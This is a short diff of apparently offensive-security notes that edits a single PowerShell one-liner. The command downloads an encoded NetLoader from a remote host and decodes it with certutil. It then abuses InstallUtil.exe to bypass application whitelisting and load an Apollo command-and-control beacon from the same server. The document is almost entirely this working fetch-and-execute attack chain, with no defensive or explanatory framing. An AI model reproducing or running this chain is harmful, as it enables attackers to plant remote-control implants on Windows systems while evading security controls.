@@ -95,6 +95,6 @@ Certutil -encode NL-mod.exe nl.enc
 
 Finally executed with
 ```powershell
-powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\enc.txt; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.235.130:8000/beacons/apollo.exe /U C:\\windows\\Tasks\\vns.exe
+powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.235.130:8000/beacons/apollo.exe /U C:\\windows\\Tasks\\vns.exe
 ```
 
